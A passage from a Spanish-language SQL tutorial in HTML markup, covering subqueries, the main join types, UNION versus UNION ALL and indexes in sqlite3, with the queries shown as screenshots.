&lt;p&gt;Bien ahora quiza te puedas preguntar por que añadimos un &lt;code&gt;ORDER BY&lt;/code&gt; y despues un &lt;code&gt;LIMIT&lt;/code&gt; si podriamos haber usado un &lt;code&gt;HAVING&lt;/code&gt; para usar una condición donde en base a &lt;code&gt;CANTIDAD_TOTAL&lt;/code&gt; nos de el valor maximo empleando la función &lt;code&gt;MAX&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query57.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que nos arroja un error.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Esto se debe a que no es posible ejecutar una función de agregación sobre el resultado de otra función de agregación.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Asi que esa opción estaria descartada.&lt;/p&gt;

&lt;h2 id=&quot;subconsultas&quot;&gt;SUBCONSULTAS &lt;a href=&quot;#subconsultas&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Hasta ahora hemos realizado consultas basandonos en una sola tabla, pero que pasa en los casos donde necesitemos juntas campos de distintas tablas  para consultar algo concreto.
Pues en ese caso existen algunas maneras y una de ellas es utilizando las &lt;code&gt;Subconsultas&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para pode usar este concepto primero debemos entender el concepto de tablas relacionales y si queremos trabajar con datos de varias tablas a traves de una relación debemos usar los &lt;code&gt;deintificadores&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Anteriomente gracias a las consultas &lt;code&gt;GROUP BY&lt;/code&gt; y &lt;code&gt;HAVING&lt;/code&gt;, pudimos agrupar por los identificadores y encontrar el producto que fue mas vendido. Pero si nos ponemos a analizar, el hecho de saber cual producto se vendio mas, no quiere decir que fue el que mas ganancias nos dio.&lt;/p&gt;

&lt;p&gt;Y si quisieramos saber cual producto nos genero mas ingresos, en este caso tendriamos que relacionar las tablas &lt;code&gt;OrderDetails&lt;/code&gt; y &lt;code&gt;Products&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Aqui es donde podemos usar el concepto de &lt;code&gt;Subconsultas&lt;/code&gt; que no es mas que una consulta dentro de otra consulta, es decir viene a ser una consulta que hace referencia a otra consulta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cuando realizamos una consulta esta nos devuelve un valor , y una subconsulta como vemos en la imagen es realizar una nueva consulta de ese valor.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Una cosa a tener en cuenta es que una &lt;code&gt;Subconsulta&lt;/code&gt; solo puede ser un &lt;code&gt;SELECT&lt;/code&gt; ya que esta solo nos devuelven información y no alteran a la base de datos.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Vamos a verlo de manera practica, y vamos a realizar una consulta que ademas de mostrarnos el id del producto &lt;code&gt;ProductID&lt;/code&gt;y la cantidad &lt;code&gt;Quantity&lt;/code&gt;, tambien nos muestre el nombre del producto &lt;code&gt;ProductName&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para ello primero seleccionaremos los campos &lt;code&gt;ProductID&lt;/code&gt; y &lt;code&gt;Quantity&lt;/code&gt; de la tabla &lt;code&gt;OrderDetails&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query58.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora en una consulta aparte, vamos a seleccionar el campo faltante &lt;code&gt;ProductName&lt;/code&gt; correspondiente a la tabla &lt;code&gt;Products&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query59.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esta consulta sera la que utilizaremos para realizar una subconsulta dentro de nuestra primera consulta.&lt;/p&gt;

&lt;p&gt;Para ello debemos de integrarlo en nuestra consulta principal como un campo y ponerlo entre &lt;code&gt;()&lt;/code&gt; y podemos ponerle el alias al que corresponde.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query60.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver que si se nos esta incluyendo el campo, pero solo se nos muestra el primer resultado repetido. Esto se debe a que al ejecutar un &lt;code&gt;SELECT&lt;/code&gt;, por cada ejecución nos esta deolviendo el primer campo, y por lo tanto dentro debemos de establecer una condición en la que comparemos que el &lt;code&gt;ProductID&lt;/code&gt; de la tabla &lt;code&gt;OrderDetails&lt;/code&gt; sea igual al del &lt;code&gt;ProductID&lt;/code&gt; de la tabla &lt;code&gt;Products&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query61.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ejecutamos la consulta correctamente, pero ahora vemos que nos vuelve a mostrar el mismo resultado. Y esto se debe a que dentro de la &lt;code&gt;subconsulta&lt;/code&gt; no se sabe a que tabla esta haciendo referencia el &lt;code&gt;ProductID&lt;/code&gt;, por lo tanto debemos especificar que esta haciendo referencia a &lt;code&gt;OrderDetails&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query62.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera vemos que ahora si, nos muestra los resultados correctamente.&lt;/p&gt;

&lt;p&gt;Y si quiseramos adicionar mas campos, hariamos exactamente el mismo proceso solo especificando el nombres de los campos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query63.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que ya comprendimos como funcionan las subconsultas, volvamos a resolver lo anteriomente propuesto en el que habiamos obtenido el producto que se vendio en mayor cantidad, pero no el que mas ingreso nos genero.&lt;/p&gt;

&lt;p&gt;Teniamos previamente la &lt;code&gt;CANTIDAD_TOTAL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query65.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora debemos agregar la subconsulta que nos devuelva el precio &lt;code&gt;Price&lt;/code&gt;, podemos usar un alias para acortar el nombre de la tabla &lt;code&gt;OrderDetails&lt;/code&gt; como &lt;code&gt;OD&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query64.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora solo nos faltaria calcular el monto total e ingreso, para ello tendriamos que multiplicar la &lt;code&gt;CANTIDAD_TOTAL&lt;/code&gt; por el &lt;code&gt;PRECIO&lt;/code&gt;, pero debido a que no podemos usar un &lt;code&gt;ALIAS&lt;/code&gt;, necesariamanete debemos insertar nuevamente la subconsulta que nos generaba el alias y de la misma manera tambien insertar la función de agregación, adicionalmente agregaremos el &lt;code&gt;NOMBRE_PRODUCTO&lt;/code&gt; para verlo mas descriptivo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query66.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y en conclusión vemos que el producto que mas se vendio, no necesariamente corresponde al que mas ingresos nos aporto.&lt;/p&gt;

&lt;p&gt;Otra cosa acerca de las subconsultas, es que tambien las podemos usar en condicionales como un &lt;code&gt;WHERE&lt;/code&gt;, para realizar operaciones con un campo sin necesidad de mostrarlo.&lt;/p&gt;

&lt;p&gt;Para ello vamos a modificar nuestra consulta anterior y borrar el campo que correspondia a el &lt;code&gt;PRECIO&lt;/code&gt; y utilizarlo para establecer una condición donde solo nos devuelva los precios mayores a 100.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query67.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Algo muy intersante a mencionar es que el resultado de esta subconsulta, nos devuelve una especie de tabla virtual en la que podemos seguir trabajando. Ya que nuestra subconsulta anterior, podemo meterla dentro de un &lt;code&gt;SELECT&lt;/code&gt; y volver a trabajar desde ahi como si fuera otra tabla mas simplificado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query68.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera podemos trabajar en ella como si fuera otra tabla, como en este caso seleccionando el campo &lt;code&gt;NOMBRE_PRODUCTO&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Intentemos realizar algo mas complejo usando subconsultas, como mostrar el total de ordenes realizadas por los clientes, siempre y cuando estas sean mayores a su promedio.&lt;/p&gt;

&lt;p&gt;Par ello primero tenemos que seleccionar el nombre &lt;code&gt;CustomerName&lt;/code&gt; de la tabla empleados &lt;code&gt;Employees&lt;/code&gt; y dentro ejecutaremos una subconsulta que nos muestre la suma de la cantidad de ordenes &lt;code&gt;SUM(Quantity)&lt;/code&gt; esto de la tabla &lt;code&gt;OrderDetails&lt;/code&gt; y de la tabla &lt;code&gt;Orders&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query69.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto nos devolvera la &lt;code&gt;CANTIDAD_DE_ORDENES_REALIZADAS&lt;/code&gt;, pero con solo un valor muy grande referido a la cantidad total de ordenes despues de realizar una especie de multiplicación como un producto cartesiano que no es la correspondiente y para poder obtener el valor verdadero. Debemos de establecer una primera condición donde el &lt;code&gt;CustomerID&lt;/code&gt; de la tabla &lt;code&gt;Customers&lt;/code&gt; sea igual al de la tabla &lt;code&gt;Orders&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query70.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora tambien debemos validar que el id de la orden &lt;code&gt;OrderID&lt;/code&gt; de la tabla &lt;code&gt;Orders&lt;/code&gt; y &lt;code&gt;OrderDetails&lt;/code&gt; sea el mismo, y de esta manera obtendriamos la cantidad total de ordenes realizadas por nuestros clientes &lt;code&gt;Customers&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query71.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya llegados a este punto queremos que solo nos muestren los resultados que sean mayor al promedio de ordenes.&lt;/p&gt;

&lt;p&gt;Para esto tenemos que recordar lo anteriormente mencionado de que podemos efectuar subconsultas en un &lt;code&gt;WHERE&lt;/code&gt;, por ello primero buscaremos calcular el promedio del total de ordenes de el resultado de una subconsulta a la que llamaremos &lt;code&gt;CANTIDAD_TOTAL_ORDENES&lt;/code&gt; proveniente de la tabla &lt;code&gt;Customers&lt;/code&gt; al cual asignaremos como alias &lt;code&gt;C2&lt;/code&gt; para evitar problemas ya que contamos con una denombre &lt;code&gt;C1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query72.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y dentro de esa subconsulta vamos a insertar la primera subconsulta que realizamos con la cual obteniamos la &lt;code&gt;CANTIDAD_ORDENES_REALIZADAS&lt;/code&gt;, solo que esta vez provendra de la tabla &lt;code&gt;Customers&lt;/code&gt; con el alias &lt;code&gt;C2&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query73.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Asi con el uso de subconsultas, lograriamos obtener el resultado donde la &lt;code&gt;CANTIDAD_ORDENES_REALIZADAS&lt;/code&gt; son mayores al promedio.&lt;/p&gt;

&lt;p&gt;Con esto concluimos que podemos usar las subconsultas en ciertos casos, pero existe una forma mejor de poder realizar estas acciones y nos eviten tener un codigo tan extenso como el que generamos y estos vendrian a ser los &lt;code&gt;JOINS&lt;/code&gt; de los cuales hablaremos a continuación.&lt;/p&gt;

&lt;h2 id=&quot;joins&quot;&gt;JOINS &lt;a href=&quot;#joins&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Son operaciones que realizamos para combinar los datos de dos o mas tablas de nuestra base de datos, pero que esta información se devuelva en una tabla nueva.&lt;/p&gt;

&lt;p&gt;Existen varios tipos de &lt;code&gt;JOINS&lt;/code&gt; y entre los principales tenemos cinco:&lt;/p&gt;

&lt;h2 id=&quot;cross-join&quot;&gt;CROSS JOIN &lt;a href=&quot;#cross-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Son el resultado de unir dos tablas, como si se tratase de un producto cartesiano.&lt;/p&gt;

&lt;p&gt;Supongamos tenemos dos tablas, una de &lt;code&gt;estudiantes&lt;/code&gt; y otra de &lt;code&gt;lenguajes&lt;/code&gt;, si aplicaramos un &lt;code&gt;CROSS JOIN&lt;/code&gt; daria como resultado el producto cartesiano de ambas tablas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Existen dos formas de definirlos, las cuales son implicita y explicita.&lt;/p&gt;

&lt;p&gt;Implicitamente cuando definimos un &lt;code&gt;CROSS JOIN&lt;/code&gt;, pero sin usar el termino &lt;code&gt;JOIN&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Si lo aplicamos a las tablas de empleados &lt;code&gt;Employees&lt;/code&gt; y ordenes &lt;code&gt;Orders&lt;/code&gt;, nos da como resultado el producto cartesiano de ambas ya que nuestra tabla &lt;code&gt;Employees&lt;/code&gt; tiene 10 registros y &lt;code&gt;Orders&lt;/code&gt; 196, como resultado nos devuelve 1960 registro relacionados.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query74.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tambien podemos obtener el mismo resultado si lo aplicamos de manera explicita, para ello varia un poco la sintaxis.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query75.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Este tipo de join casi no se usa, pero es recomendable conocer como funciona.&lt;/p&gt;

&lt;h2 id=&quot;inner-join&quot;&gt;INNER JOIN &lt;a href=&quot;#inner-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es el resultado de la busqueda de coincidencia de dos o mas tablas en función a la columna que tengan en comun.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/img1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Supongamos tenemos dos tablas una de personas que estudian y otra de personas que trabajan, como resultado el &lt;code&gt;INNER JOIN&lt;/code&gt; nos daria unicamente las coincidencias de ambas tablas donde las personas estudian y trabajan.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para aplicarlo a nuestra tablas de empleados y ordenes, primero debemos seleccionar nuestra tabla &lt;code&gt;Employees&lt;/code&gt; y seguidamente &lt;code&gt;INNER JOIN&lt;/code&gt; con la tabla &lt;code&gt;Orders&lt;/code&gt; y finalmente para ejecutar la concidencia usaremos &lt;code&gt;ON&lt;/code&gt; especificando que queremos nos lo ejecute solo cuando el &lt;code&gt;EmployeeID&lt;/code&gt; de ambas tablas sean iguales.&lt;/p&gt;

&lt;p&gt;Esto nos dara como resultado una nueva tabla donde solo nos muestren los datos cuando coincidan los &lt;code&gt;EmployeeID&lt;/code&gt; en ambas tablas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query76.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para entenderlo mejor de manera practica, vamos a crearnos una tabla adicional con el nombre &lt;code&gt;Gratificacion&lt;/code&gt;, en donde haremos referencia al &lt;code&gt;EmployeeID&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query77.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora insertaremos algunos valores al azar para poder trabajar nuestro &lt;code&gt;JOIN&lt;/code&gt; con esta tabla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query78.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Adicional a ello insertaremos algunos valores &lt;code&gt;NULL&lt;/code&gt;, para este caso.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query79.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nuestra tabla nos queda de la siguiente forma, donde podemos observar existen valores nulos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query80.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a proceder a realizar un &lt;code&gt;INNER JOIN&lt;/code&gt;, tomando como tablas &lt;code&gt;Employees&lt;/code&gt; y &lt;code&gt;Gratificacion&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query81.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como resultado, podemos ver que solo se nos muestran las coincidencias y no los valores &lt;code&gt;NULL&lt;/code&gt; ya que estos al no coincidir con el &lt;code&gt;EmployeeID&lt;/code&gt; no los concidera.&lt;/p&gt;

&lt;h2 id=&quot;left-join&quot;&gt;LEFT JOIN &lt;a href=&quot;#left-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;En el &lt;code&gt;LEFT JOIN&lt;/code&gt; se toma como prioritaria a toda la tabla de la izquierda y solo una parte de la tabla derecha, concretamente solo si existe alguna coincidencia.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/img2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Usemos el mismo caso donde tenemos dos tablas de personas que estudian y otra de personas que trabajan, si aplicamos un &lt;code&gt;LEFT JOIN&lt;/code&gt;, como resultado tendriamos todos los datos de la tabla &lt;code&gt;personas que estudian&lt;/code&gt; con sus coincidencias y de no existir alguna se completaria con valores &lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora lo vemos de manera practica y usamos en nuestras tablas &lt;code&gt;Employees&lt;/code&gt; y &lt;code&gt;Gratificacion&lt;/code&gt;, es muy simple ya que solo debemos cambiar la palabra inner por &lt;code&gt;LEFT&lt;/code&gt; y igualmente para establecer la comparacion usamos &lt;code&gt;ON&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query82.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;El resultado de la consulta nos muestra todos los valores de la tabla &lt;code&gt;Employees&lt;/code&gt; y de la tabla &lt;code&gt;Gratificacion&lt;/code&gt; solo los valores donde exista coindencias, y en las que no existan nos las completa con valores nulos.&lt;/p&gt;

&lt;h2 id=&quot;right-join&quot;&gt;RIGHT JOIN &lt;a href=&quot;#right-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Similar al left join cuando usamos &lt;code&gt;RIGHT JOIN&lt;/code&gt;, se toman todos los datos de la tabla derecha y solo parte de la izquierda.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/img3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De la misma manera con nuestras tablas de persona que estudian y trabajan, al aplicar un &lt;code&gt;RIGHT JOIN&lt;/code&gt; tendriamos como resultado todos los valores de la tabla derecha &lt;code&gt;personas que trabajan&lt;/code&gt; y de no existir coincidencias de igual modo se completarian con datos de tipo &lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aplicandolo nuevamente a nuestras tablas &lt;code&gt;Employees&lt;/code&gt; y &lt;code&gt;Gratificacion&lt;/code&gt;, seria muy parecido a lo anterior, solo que en este caso particular, &lt;code&gt;sqlite3&lt;/code&gt; no admite la función &lt;code&gt;RIGHT JOIN&lt;/code&gt;, ya que si la tratamos de ejecutar nos genera un error.&lt;/p&gt;

&lt;p&gt;Aunque en otros tipos de gestores esta opción si es valida, hay un manera logica y facil de solucionar esto en &lt;code&gt;sqlite3&lt;/code&gt; y es tan sencillo como aplicar un &lt;code&gt;LEFT JOIN&lt;/code&gt;, pero cambiar el orden de las tablas y de esa manera es como si ejecutaramos un &lt;code&gt;RIGHT JOIN&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query83.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y asi de una forma simple logramos aplicar un &lt;code&gt;RIGHT JOIN&lt;/code&gt; que vendria mas o menos a ser un &lt;code&gt;LEFT JOIN&lt;/code&gt; inverso .&lt;/p&gt;

&lt;h2 id=&quot;full-join&quot;&gt;FULL JOIN &lt;a href=&quot;#full-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;A diferencia que el left y right join, cuando aplicamos un &lt;code&gt;FULL JOIN&lt;/code&gt; nos devuelve todo, es decir la suma de las tablas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/img4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Es la union de todas las tablas, al aplicar un &lt;code&gt;FULL JOIN&lt;/code&gt;, nos devuelve todos los valores de ambas tablas y no de existir coindencias entre algunos campos, de la misma manera nos los muestra con valores nulos &lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para poder aplicarlo en &lt;code&gt;sqlite3&lt;/code&gt; de manera practica, tambien tenemos un problema puesto que tampo acepta la ejecución de &lt;code&gt;FULL JOIN&lt;/code&gt;, pero para ello podemos usar una clausula
que nos permita unir tanto el &lt;code&gt;LEFT JOIN&lt;/code&gt; como el &lt;code&gt;RIGTH JOIN&lt;/code&gt; y esta tiene por nombre  &lt;code&gt;UNION&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;clausula-union&quot;&gt;CLAUSULA UNION &lt;a href=&quot;#clausula-union&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La clausula &lt;code&gt;UNION&lt;/code&gt; la utilizamos para combinar el resultado de dos o mas consultas en un solo conjunto de datos.&lt;/p&gt;

&lt;p&gt;Para poder usar esta clausula se deben tener la misma cantidad de columnas y los tipos de datos deben de ser compatibles.&lt;/p&gt;

&lt;p&gt;Lo que hace concretamente &lt;code&gt;UNION&lt;/code&gt; es la devolvernos una unica tabla que contenga las filas combinadas de las tablas, eliminando las duplicadas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora ejecutamos un &lt;code&gt;LEFT JOIN&lt;/code&gt; y un &lt;code&gt;RIGHT JOIN&lt;/code&gt;, al unir ambas consultas con un &lt;code&gt;UNION&lt;/code&gt; obtendremos como resultado un &lt;code&gt;FULL JOIN&lt;/code&gt; simulado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query84.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;clausula-union-all&quot;&gt;CLAUSULA UNION ALL &lt;a href=&quot;#clausula-union-all&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;A diferencia que al usar union, cuando usamos la clausula &lt;code&gt;UNION ALL&lt;/code&gt;, de la combinación de las filas no se eliminan las que son duplicadas y tampoco se realiza una verificación de la compatibilidad de datos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como resultado si lo aplicamos a  nuestros &lt;code&gt;JOINS&lt;/code&gt;, nos devulve mas datos, donde podemos ver que estos se duplican.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query85.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En conclusión podriamos inferir que al combinar con &lt;code&gt;UNION&lt;/code&gt; nos elimina las filas duplicadas y al usar &lt;code&gt;UNION ALL&lt;/code&gt; de existir filas duplicadas las muestra.&lt;/p&gt;

&lt;h2 id=&quot;indices&quot;&gt;INDICES &lt;a href=&quot;#indices&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los indices en &lt;code&gt;SQL&lt;/code&gt; vienen a ser una estructura de datos que mejoran la velocidad de la consultas y las operaciones de busquedas en un tabla. En terminos mas simples un indice nos permite acceder rapidamente a los registros de una tabla en función de los valores de una o mas columnas, de esta manera nuestras busquedas son mas eficientes.&lt;/p&gt;

&lt;h2 id=&quot;indices-ordinarios-index&quot;&gt;INDICES ORDINARIOS - INDEX &lt;a href=&quot;#indices-ordinarios-index&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los indices ordinarios o no unicos, crean indices que se pueden duplicar y ademas permiten incluir valores nulos. Solo usa el indice para buscar mas rapido pero obvia si existen o no duplicados.&lt;/p&gt;

&lt;p&gt;Para crear un indice debemos usar &lt;code&gt;CREATE INDEX&lt;/code&gt; y seguido el nombre a asignar, depues con &lt;code&gt;ON&lt;/code&gt; especificaremos de que tabla queremos crear el indice y finalmente entre &lt;code&gt;()&lt;/code&gt; debemos espeficar el campo especifico sobre el cual lo aplicaremos.&lt;/p&gt;

&lt;p&gt;En este caso primero ejecutaremos una consulta que nos muestre todo de la tabla clientes &lt;code&gt;Customers&lt;/code&gt;, donde el &lt;code&gt;ContactName&lt;/code&gt; corresponda al de &lt;code&gt;Hanna Moos&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query86.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos observar que nuestra consulta se ejecuta en un periodo de &lt;code&gt;5ms&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Lo siguiente que haremos es crear un indice en el campo &lt;code&gt;ContactName&lt;/code&gt; de la tabla &lt;code&gt;Customers&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query87.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora si volvemos a ejecutar la consulta anterior, observamos que la consulta esta vez solo tarda &lt;code&gt;1ms&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query88.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto no puede parecer notorio a consultas en una escala baja, pero de esta manera los &lt;code&gt;INDICES&lt;/code&gt; nos dan una solución con la que podemos alivianar bastante el tiempo de consultas que son muy pesadas.&lt;/p&gt;

&lt;h2 id=&quot;indices-primarios-primary-keys&quot;&gt;INDICES PRIMARIOS - PRIMARY KEYS &lt;a href=&quot;#indices-primarios-primary-keys&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los indices primarios, son los ya mencionados &lt;code&gt;PRIMARY KEYS&lt;/code&gt;, estos tienen como finalidad el permitirnos identidicar las filas de manera unica.&lt;/p&gt;

&lt;p&gt;En este caso puntual si seleccionamos los datos de la tabla &lt;code&gt;Customers&lt;/code&gt;, los indices primarios serian los valores correspondientes al &lt;code&gt;CustomerID&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query90.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;indices-unicos-unique-index&quot;&gt;INDICES UNICOS - UNIQUE INDEX &lt;a href=&quot;#indices-unicos-unique-index&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

